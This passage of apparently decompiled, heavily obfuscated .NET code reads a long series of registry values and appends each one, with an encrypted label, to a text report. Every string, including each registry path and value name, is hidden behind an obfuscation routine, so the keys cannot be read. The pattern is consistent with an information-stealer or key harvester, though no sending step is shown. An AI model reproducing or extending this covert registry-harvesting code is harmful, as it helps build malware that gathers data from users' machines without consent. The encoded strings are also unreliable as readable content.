						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("{Źɴ\u0369Ѱբ٢ݯࡪ०੶\u0b65౦\u0d65\u0e6d\u0f6d\u106dᅧች፳ᑐᕘᙉᝋᡚ᥈\u1a5c\u1b44᱖ᵵṡώ\u2065ⅻ≢⍹①╠♑❏⡪⥦⩥⬨ⱨⵠ⸥⽀ぶㅶ㉸"), GClass0.smethod_0("eŪɠ\u0368ѧո"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_08b6;
						}
						goto IL_090d;
						IL_08b6:
						num = 43;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("Lůɡ\u0360Ыեٯܨࡃॳ\u0a71\u0b7dసസ\u0e3a")), Registry.GetValue(GClass0.smethod_0("{Źɴ\u0369Ѱբ٢ݯࡪ०੶\u0b65౦\u0d65\u0e6d\u0f6d\u106dᅧች፳ᑐᕘᙉᝋᡚ᥈\u1a5c\u1b44᱖ᵵṡώ\u2065ⅻ≢⍹①╠♑❏⡪⥦⩥⬨ⱨⵠ⸥⽀ぶㅶ㉸"), GClass0.smethod_0("eŪɠ\u0368ѧո"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_090d;
						IL_090d:
						num = 45;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\fĈȇ\u0318Пճٱݾ\u087dॷ\u0a65୴౹൴\u0e7e\u0f7cၺᅶቮ።ᑿᕩᙺ\u177aᡭ\u1979\u1a6f᭵ᱩᵄṒὌ⁒⅊≑⍈\u244f╱♂❞⡽⥷⩶⬹ⱷ\u2d71⸶⽑ちㅧ㉫㌱㑅㕡㙧㝹㡩㥯㨪㭆㱮㵡㹣㽫䁷䅪䉴䍤"), GClass0.smethod_0("hŧɸ"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_093d;
						}
						goto IL_0994;
						IL_093d:
						num = 46;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("cžɲͱмմټ\u0739\u085c\u0962\u0a62୬ఴ\u0d46\u0e7c\u0f78\u1064ᅪቪጭᑃᕭᙬᝬᡦᥴ\u1a6f\u1b73ᱡᴸḸἺ")), Registry.GetValue(GClass0.smethod_0("\fĈȇ\u0318Пճٱݾ\u087dॷ\u0a65୴౹൴\u0e7e\u0f7cၺᅶቮ።ᑿᕩᙺ\u177aᡭ\u1979\u1a6f᭵ᱩᵄṒὌ⁒⅊≑⍈\u244f╱♂❞⡽⥷⩶⬹ⱷ\u2d71⸶⽑ちㅧ㉫㌱㑅㕡㙧㝹㡩㥯㨪㭆㱮㵡㹣㽫䁷䅪䉴䍤"), GClass0.smethod_0("hŧɸ"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_0994;
						IL_0994:
						num = 48;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("}ſɶ\u036bѮռ٠ݭ\u086cॠੴ୧౨൫\u0e6f\u0f6f\u106bᅡቿ፱ᑮᕦᙋᝉᡜ᥎\u1a5eᭆ᱘ᵻṣ\u1f7f\u2063ⅽ≠⍻⑾╾♓❍⡬⥠⩧⬪ⱦ\u2d6e⸧⽂ばㅰ㉺㌢㐳"), GClass0.smethod_0("eŪɠ\u0368ѧո"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_09c4;
						}
						goto IL_0a1b;
						IL_09c4:
						num = 49;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("Rűɣ\u0362Эգ٭ܪࡍॽੳ\u0b7fథശ\u0e38༸\u103a")), Registry.GetValue(GClass0.smethod_0("}ſɶ\u036bѮռ٠ݭ\u086cॠੴ୧౨൫\u0e6f\u0f6f\u106bᅡቿ፱ᑮᕦᙋᝉᡜ᥎\u1a5eᭆ᱘ᵻṣ\u1f7f\u2063ⅽ≠⍻⑾╾♓❍⡬⥠⩧⬪ⱦ\u2d6e⸧⽂ばㅰ㉺㌢㐳"), GClass0.smethod_0("eŪɠ\u0368ѧո"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_0a1b;
						IL_0a1b:
						num = 51;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("}ſɶ\u036bѮռ٠ݭ\u086cॠੴ୧౨൫\u0e6f\u0f6f\u106bᅡቿ፱ᑮᕦᙋᝉᡜ᥎\u1a5eᭆ᱘ᵻṣ\u1f7f\u2063ⅽ≠⍻⑾╾♓❍⡬⥠⩧⬪ⱦ\u2d6e⸧⽂ばㅰ㉺㌢㐵"), GClass0.smethod_0("eŪɠ\u0368ѧո"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_0a4b;
						}
						goto IL_0aa2;
						IL_0a4b:
						num = 52;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("Rűɣ\u0362Эգ٭ܪࡍॽੳ\u0b7fథര\u0e38༸\u103a")), Registry.GetValue(GClass0.smethod_0("}ſɶ\u036bѮռ٠ݭ\u086cॠੴ୧౨൫\u0e6f\u0f6f\u106bᅡቿ፱ᑮᕦᙋᝉᡜ᥎\u1a5eᭆ᱘ᵻṣ\u1f7f\u2063ⅽ≠⍻⑾╾♓❍⡬⥠⩧⬪ⱦ\u2d6e⸧⽂ばㅰ㉺㌢㐵"), GClass0.smethod_0("eŪɠ\u0368ѧո"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_0aa2;
						IL_0aa2:
						num = 54;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\u007fŽɰ\u036dѬվپݳ\u086e\u0962ੲୡ౪൩\u0e61ཡ\u1069ᅣቹ፷ᑬᕤᙵ\u1777ᡞ᥌\u1a58\u1b40ᱚᵹṭά\u2061ⅿ≦⍽⑼╼♍❓⡮⥢⩡⬬Ɽ\u2d6c⸩⽌ひㅲ㉼㌤㑔㕃㙖"), GClass0.smethod_0("eŪɠ\u0368ѧո"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_0ad2;
						}
						goto IL_0b29;
						IL_0ad2:
						num = 55;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("PųɽͼЯա٫ܬࡏॿ\u0a7dୱధ\u0d51ไན\u1038ᄸሺ")), Registry.GetValue(GClass0.smethod_0("\u007fŽɰ\u036dѬվپݳ\u086e\u0962ੲୡ౪൩\u0e61ཡ\u1069ᅣቹ፷ᑬᕤᙵ\u1777ᡞ᥌\u1a58\u1b40ᱚᵹṭά\u2061ⅿ≦⍽⑼╼♍❓⡮⥢⩡⬬Ɽ\u2d6c⸩⽌ひㅲ㉼㌤㑔㕃㙖"), GClass0.smethod_0("eŪɠ\u0368ѧո"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_0b29;
						IL_0b29:
						num = 57;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("cšɬͱѸժ٪ݧࡢ८\u0a7e୭\u0c5e൝๕ཕၕᅟቅፋᑘᕐᙁᝃᡒ᥀ᩔ\u1b4cᱛᵆṜὐ⁏Ⅻ≾⍦\u2427╩♣✤⡔⥣⩳"), GClass0.smethod_0("FŀɈ\u0347ј"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_0b59;
						}
						goto IL_0bb0;
						IL_0b59:
						num = 58;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("JŬɻ\u0365Ъզٮܧࡑ।੶ସసഺ")), Registry.GetValue(GClass0.smethod_0("cšɬͱѸժ٪ݧࡢ८\u0a7e୭\u0c5e൝๕ཕၕᅟቅፋᑘᕐᙁᝃᡒ᥀ᩔ\u1b4cᱛᵆṜὐ⁏Ⅻ≾⍦\u2427╩♣✤⡔⥣⩳"), GClass0.smethod_0("FŀɈ\u0347ј"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_0bb0;
						IL_0bb0:
						num = 60;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("rŲɽ\u036eѩչٻݰ\u0873ॽ੯\u0b62౯൮\u0e64ར\u1064ᅬቴ፴ᑩᕣᙰ\u1774ᡣᥳ\u1a65\u1b43\u1c4aᵕṍ\u1f47⁞ⅸ≯⍹\u2436╺♲✳⡅⥰⩢⬯Ⱓⴭ⹈⽪へㅢ㈨㍄㑴㕰㙷㝢㡦㥤"), GClass0.smethod_0("FŀɈ\u0347ј"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_0be0;
						}
						goto IL_0c37;
						IL_0be0:
						num = 61;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("_ŻɮͶзչٳ\u0734ࡄॳ\u0a63ର\u0c4b൯\u0e7fཧ\u102bᅉቻ\u137dᑴᕧᙡᝡᠸ\u1938ᨺ")), Registry.GetValue(GClass0.smethod_0("rŲɽ\u036eѩչٻݰ\u0873ॽ੯\u0b62౯൮\u0e64ར\u1064ᅬቴ፴ᑩᕣᙰ\u1774ᡣᥳ\u1a65\u1b43\u1c4aᵕṍ\u1f47⁞ⅸ≯⍹\u2436╺♲✳⡅⥰⩢⬯Ⱓⴭ⹈⽪へㅢ㈨㍄㑴㕰㙷㝢㡦㥤"), GClass0.smethod_0("FŀɈ\u0347ј"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_0c37;
						IL_0c37:
						num = 63;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("rŲɽ\u036eѩչٻݰ\u0873ॽ੯\u0b62౯൮\u0e64ར\u1064ᅬቴ፴ᑩᕣᙰ\u1774ᡣᥳ\u1a65\u1b43\u1c4aᵕṍ\u1f47⁞ⅸ≯⍹\u2436╺♲✳⡅⥰⩢⬯Ⱓⴭ⹈⽪へㅢ㈨㍄㑴㕰㙷㝢㡦㥤"), GClass0.smethod_0("^ļȷ\u034dцՀو\u0747ࡘ"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_0c67;
						}
						goto IL_0cbe;
						IL_0c67:
						num = 64;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("RŴɣͽвվٶܯ\u0859६\u0a7eଫ\u0c49ൻ\u0e7d\u0f74\u1067ᅡቡጸᐸᔺ")), Registry.GetValue(GClass0.smethod_0("rŲɽ\u036eѩչٻݰ\u0873ॽ੯\u0b62౯൮\u0e64ར\u1064ᅬቴ፴ᑩᕣᙰ\u1774ᡣᥳ\u1a65\u1b43\u1c4aᵕṍ\u1f47⁞ⅸ≯⍹\u2436╺♲✳⡅⥰⩢⬯Ⱓⴭ⹈⽪へㅢ㈨㍄㑴㕰㙷㝢㡦㥤"), GClass0.smethod_0("^ļȷ\u034dцՀو\u0747ࡘ"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_0cbe;
						IL_0cbe:
						num = 66;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("rŲɽ\u036eѩչٻݰ\u0873ॽ੯\u0b62౯൮\u0e64ར\u1064ᅬቴ፴ᑩᕣᙰ\u1774ᡣᥳ\u1a65\u1b43\u1c4aᵕṍ\u1f47⁞ⅸ≯⍹\u2436╺♲✳⡅⥰⩢⬯Ⱓⴭ⹈⽪へㅢ㈨㍄㑴㕰㙷㝢㡦㥤"), GClass0.smethod_0("_şɖ\u0346рՈهݘ"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_0cee;
						}
						goto IL_0d45;
						IL_0cee:
						num = 67;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("RŴɣͽвվٶܯ\u0859६\u0a7eଫ\u0c49ൻ\u0e7d\u0f74\u1067ᅡቡጸᐸᔺ")), Registry.GetValue(GClass0.smethod_0("rŲɽ\u036eѩչٻݰ\u0873ॽ੯\u0b62౯൮\u0e64ར\u1064ᅬቴ፴ᑩᕣᙰ\u1774ᡣᥳ\u1a65\u1b43\u1c4aᵕṍ\u1f47⁞ⅸ≯⍹\u2436╺♲✳⡅⥰⩢⬯Ⱓⴭ⹈⽪へㅢ㈨㍄㑴㕰㙷㝢㡦㥤"), GClass0.smethod_0("_şɖ\u0346рՈهݘ"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_0d45;
						IL_0d45:
						num = 69;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("~žɱ\u036aѭսٿݬ\u086fॡੳ୦౫൪\u0e60\u0f6e\u1068ᅠቸ፰ᑭᕧᙴᝈᡟ᥏\u1a59ᭇ᱉ᵜṟὖ⁊⅘≱⍷⑻╴♦❮⡢⤭⩅⭂Ⱚⵝ\u2e67⽳でㅩ㈤㍔㑣㕳"), GClass0.smethod_0("FŀɈ\u0367Ѹ"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_0d75;
						}
						goto IL_0dcc;
						IL_0d75:
						num = 70;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("UŲɲͼѱեٳݽ࠰\u0946\u0a47ଭౘ\u0d64\u0e7eཨ\u1064ᄧቑ፤ᑶᔸᘸ\u173a")), Registry.GetValue(GClass0.smethod_0("~žɱ\u036aѭսٿݬ\u086fॡੳ୦౫൪\u0e60\u0f6e\u1068ᅠቸ፰ᑭᕧᙴᝈᡟ᥏\u1a59ᭇ᱉ᵜṟὖ⁊⅘≱⍷⑻╴♦❮⡢⤭⩅⭂Ⱚⵝ\u2e67⽳でㅩ㈤㍔㑣㕳"), GClass0.smethod_0("FŀɈ\u0367Ѹ"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_0dcc;
						IL_0dcc:
						num = 72;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("qųɲ\u036fѪոټݱ\u0870ॼ\u0a70\u0b63౬൯\u0e63ལ\u1067ᅭቻ፵ᑪᕢᙷ\u1775ᡠᥲ\u1a5a\u1b42ᱜᵸṴὸ⁼⅄≐⍹⑹╽♥❷⡍⤥⨡⬾ⱑⵞ\u2e6e⽭だㅻ㉳㍴㑤㕰㙪㝭㡯"), GClass0.smethod_0("Uŀɖ\u034aуՍ"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_0dfc;
						}
						goto IL_0e53;
						IL_0dfc:
						num = 73;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("Sŵɿ\u036dѫԭ\u064bݤࡦॠ\u0a7e\u0b62దരส༳ဢᄻ")), Registry.GetValue(GClass0.smethod_0("qųɲ\u036fѪոټݱ\u0870ॼ\u0a70\u0b63౬൯\u0e63ལ\u1067ᅭቻ፵ᑪᕢᙷ\u1775ᡠᥲ\u1a5a\u1b42ᱜᵸṴὸ⁼⅄≐⍹⑹╽♥❷⡍⤥⨡⬾ⱑⵞ\u2e6e⽭だㅻ㉳㍴㑤㕰㙪㝭㡯"), GClass0.smethod_0("Uŀɖ\u034aуՍ"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_0e53;
						IL_0e53:
						num = 75;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("vŶɹ\u0362ѥյٷݴ\u0877ॹ੫\u0b7e\u0c73൲\u0e78ས\u1060ᅨተ፸ᑥᕯᙼᝰᡧ\u1977\u1a61\u1b7f᱃ᵉṅ\u1f7e⁺⅁≕⍵⑩╭♹❻⡺⥴⩠⭺ⱽ\u2d7f⹌⽍くㅆ㉐㍅㑯㕻㙧㜧㠱㥙㩍㭭㱤㵮"), GClass0.smethod_0("AŴɢ\u0366ѯաػݔ࠻स\u0a31ଷళര\u0e31\u0f37\u103aᄴ"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_0e83;
						}
						goto IL_0eda;
						IL_0e83:
						num = 76;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("Gŭɵ\u0369ХԳظ\u0738࠺")), Registry.GetValue(GClass0.smethod_0("vŶɹ\u0362ѥյٷݴ\u0877ॹ੫\u0b7e\u0c73൲\u0e78ས\u1060ᅨተ፸ᑥᕯᙼᝰᡧ\u1977\u1a61\u1b7f᱃ᵉṅ\u1f7e⁺⅁≕⍵⑩╭♹❻⡺⥴⩠⭺ⱽ\u2d7f⹌⽍くㅆ㉐㍅㑯㕻㙧㜧㠱㥙㩍㭭㱤㵮"), GClass0.smethod_0("AŴɢ\u0366ѯաػݔ࠻स\u0a31ଷళര\u0e31\u0f37\u103aᄴ"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_0eda;
						IL_0eda:
						num = 78;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("xŤɫʹѳէ٥ݪࡩ५\u0a79୨\u0c65ൠ\u0e6aཨၮᅚቂፎᑓᕝᙎᝎᡙ᥅ᩓᭉ᱕ᵐṖἱ⁃ⅶ≽⍹⑩╦♹❕⡘⥮⩥⭤ⱒ\u2d6a\u2e67⽶"), GClass0.smethod_0("Aťɨ\u036fѧջ٢\u0748\u0870३\u0a61୧\u0c73"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_0f0a;
						}
						goto IL_0f61;
						IL_0f0a:
						num = 79;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("Rőɕ\u0343Ѷսٹݩࡦॹ\u0a29\u0b58౮\u0d65ไདྷ\u106aᅧቶ")), Registry.GetValue(GClass0.smethod_0("xŤɫʹѳէ٥ݪࡩ५\u0a79୨\u0c65ൠ\u0e6aཨၮᅚቂፎᑓᕝᙎᝎᡙ᥅ᩓᭉ᱕ᵐṖἱ⁃ⅶ≽⍹⑩╦♹❕⡘⥮⩥⭤ⱒ\u2d6a\u2e67⽶"), GClass0.smethod_0("Aťɨ\u036fѧջ٢\u0748\u0870३\u0a61୧\u0c73"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_0f61;
						IL_0f61:
						num = 81;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("yŻɪͷѲՠ٤ݩࡨ।\u0a78୫\u0c64൧\u0e6bཫၯᅥቃፍᑒᕚᙏᝍᡘ᥊ᩒᭊ᱐ᵡṴίⁿℰ≜⍷⑾╸♮❧⡺⥔⩆⭥ⱱⵋ\u2e65⽕だ"), GClass0.smethod_0("[ŭɠ\u0348Ѱթ١ݧ\u0873"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_0f91;
						}
						goto IL_0fe8;
						IL_0f91:
						num = 82;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("Lůɿ\u032aѦծاݑࡤॶਸସ\u0c3a")), Registry.GetValue(GClass0.smethod_0("yŻɪͷѲՠ٤ݩࡨ।\u0a78୫\u0c64൧\u0e6bཫၯᅥቃፍᑒᕚᙏᝍᡘ᥊ᩒᭊ᱐ᵡṴίⁿℰ≜⍷⑾╸♮❧⡺⥔⩆⭥ⱱⵋ\u2e65⽕だ"), GClass0.smethod_0("[ŭɠ\u0348Ѱթ١ݧ\u0873"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_0fe8;
						IL_0fe8:
						num = 84;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("tŰɿ\u0360ѧջٹݶ\u0875ॿ੭\u0b7c\u0c71൬\u0e66ཤ\u1062ᅮቶ፺ᑧᕡᙲ\u1772ᡥᥱ\u1a67\u1b7dᱡᵻṱ\u1f7f⁹ⅇ≊⍱⑷╣♹❦⡼⥼⩢⭍Ⱗⴡ⸾⽑ぞㅮ㉭㍠㑻㕳㙴㝤㡰㥪㩭㭯"), GClass0.smethod_0("Uŀɖ\u034aуՍ"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_1018;
						}
						goto IL_106f;
						IL_1018:
						num = 85;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("@ŧɡ\u0379ѣո٢ݦ\u0878ध\u0a31ଫఴസ\u0e38༺")), Registry.GetValue(GClass0.smethod_0("tŰɿ\u0360ѧջٹݶ\u0875ॿ੭\u0b7c\u0c71൬\u0e66ཤ\u1062ᅮቶ፺ᑧᕡᙲ\u1772ᡥᥱ\u1a67\u1b7dᱡᵻṱ\u1f7f⁹ⅇ≊⍱⑷╣♹❦⡼⥼⩢⭍Ⱗⴡ⸾⽑ぞㅮ㉭㍠㑻㕳㙴㝤㡰㥪㩭㭯"), GClass0.smethod_0("Uŀɖ\u034aуՍ"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_106f;
						IL_106f:
						num = 87;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\u0005ćȎ\u0313ЖԄ؈܅ࠄईਜଏ\u0c00\u0d03\u0e77\u0f77\u1073ᅹቧ፩ᑶᕾᙣᝡᡴᥦ\u1a76\u1b6eᱴᵜṌὁ\u2040ⅰ≪⍎\u245f╉♉❅⡀⥀⨃⭲ⱥⵦ⸿⽎ぼㅯ㉨㍭㑶㕪㙳㜶㡇㥱㩰㭽㱧㵵㹽㽷䁑䅞䉮䍭䑠䕻䙳䝴䡤䥰䩪䭭䱯"), GClass0.smethod_0("GŬɦ\u0364"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_109f;
						}
						goto IL_10f6;
						IL_109f:
						num = 88;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("aŻɨͼѲոٿݽ࠸\u0947\u0a52\u0b53ఴ\u0d43\u0e73ར\u1063ᅸቡ\u137fᑨᔫᙘᝬᡫᥨ\u1a70᭠ᱶᵺḢἻ")), Registry.GetValue(GClass0.smethod_0("\u0005ćȎ\u0313ЖԄ؈܅ࠄईਜଏ\u0c00\u0d03\u0e77\u0f77\u1073ᅹቧ፩ᑶᕾᙣᝡᡴᥦ\u1a76\u1b6eᱴᵜṌὁ\u2040ⅰ≪⍎\u245f╉♉❅⡀⥀⨃⭲ⱥⵦ⸿⽎ぼㅯ㉨㍭㑶㕪㙳㜶㡇㥱㩰㭽㱧㵵㹽㽷䁑䅞䉮䍭䑠䕻䙳䝴䡤䥰䩪䭭䱯"), GClass0.smethod_0("GŬɦ\u0364"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_10f6;
						IL_10f6:
						num = 90;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\u0019ěȊ\u0317ВԀ\u0604܉ࠈऄਘଋ\u0c04ഇซ་ဏᄅባ፭ᑲᕺᙯ\u176dᡸᥪ\u1a72᭪ᱰᵘṐὝ⁜Ⅼ≮⍊\u245b╍♅❉⡌⥌⨇⭶ⱡⵢ⸃⽲\u3040ㅓ㉬㍩㑲㕮㙿㜺㡋㥽㩴㭹㱣㵱㹡㽫䀱䅀䉽䍡䑑䕞䙮䝭䡠䥻䩳䭴䱤䵰乪佭偯"), GClass0.smethod_0("GŬɦ\u0364"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_1126;
						}
						goto IL_117d;
						IL_1126:
						num = 91;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("dŀɕ\u0343яՃٺݺ࠽\u094c\u0a5fଡ଼హ\u0d48\u0e76ཥၦᅣቼ፠ᑵᔰᙝᝫᡮᥣ\u1a7d\u1b6fᱻᵱḧὖ⁷Ⅻ∸⌸\u243a")), Registry.GetValue(GClass0.smethod_0("\u0019ěȊ\u0317ВԀ\u0604܉ࠈऄਘଋ\u0c04ഇซ་ဏᄅባ፭ᑲᕺᙯ\u176dᡸᥪ\u1a72᭪ᱰᵘṐὝ⁜Ⅼ≮⍊\u245b╍♅❉⡌⥌⨇⭶ⱡⵢ⸃⽲\u3040ㅓ㉬㍩㑲㕮㙿㜺㡋㥽㩴㭹㱣㵱㹡㽫䀱䅀䉽䍡䑑䕞䙮䝭䡠䥻䩳䭴䱤䵰乪佭偯"), GClass0.smethod_0("GŬɦ\u0364"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_117d;
						IL_117d:
						num = 93;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("\u0005ćȎ\u0313ЖԄ؈܅ࠄईਜଏ\u0c00\u0d03\u0e77\u0f77\u1073ᅹቧ፩ᑶᕾᙣᝡᡴᥦ\u1a76\u1b6eᱴᵜṌὁ\u2040ⅰ≪⍎\u245f╉♉❅⡀⥀⨃⭸ⱨ⵰⸿⽎ぼㅯ㉨㍭㑶㕪㙳㜶㡇㥱㩰㭽㱧㵵㹽㽷䁑䅞䉮䍭䑠䕻䙳䝴䡤䥰䩪䭭䱯"), GClass0.smethod_0("GŬɦ\u0364"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_11ad;
						}
						goto IL_1204;
						IL_11ad:
						num = 94;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)string.Concat(text + GClass0.smethod_0("Sŋȣ\u0322џծٸݠࡩ५੭ୠ౽സ\u0e38༺"), GClass0.smethod_0("cŅɖ;Ѱվٹݿ࠺\u0943\u0a51\u0b47శ\u0d45\u0e75འၡᅦቿ\u137dᑪᔭᙞᝮᡩᥦ\u1a7e᭢ᱴᵼṘἸ‸℺")), Registry.GetValue(GClass0.smethod_0("\u0005ćȎ\u0313ЖԄ؈܅ࠄईਜଏ\u0c00\u0d03\u0e77\u0f77\u1073ᅹቧ፩ᑶᕾᙣᝡᡴᥦ\u1a76\u1b6eᱴᵜṌὁ\u2040ⅰ≪⍎\u245f╉♉❅⡀⥀⨃⭸ⱨ⵰⸿⽎ぼㅯ㉨㍭㑶㕪㙳㜶㡇㥱㩰㭽㱧㵵㹽㽷䁑䅞䉮䍭䑠䕻䙳䝴䡤䥰䩪䭭䱯"), GClass0.smethod_0("GŬɦ\u0364"), null)), (object)GClass0.smethod_0("2Ĳȼ\u033dпԿٽܩ\u087f")));
						goto IL_1204;
						IL_1204:
						num = 96;
						if (Operators.ConditionalCompareObjectNotEqual(Registry.GetValue(GClass0.smethod_0("xŤɫʹѳէ٥ݪࡩ५\u0a79୨\u0c65ൠ\u0e6aཨၮᅚቂፎᑓᕝᙎᝎᡙ᥅ᩓᭉ᱇ᵦṼί⁼Ⅰ≹⍨⑾╸♖❈⡦⥩⩩⬥ⰵⴴ⸲⼰"), GClass0.smethod_0("[Ţɴ\u036cѥկ\u064cݮ"), null), (object)GClass0.smethod_0(""), false))
						{
							goto IL_1234;
						}
						goto IL_128b;
						IL_1234:
						num = 97;
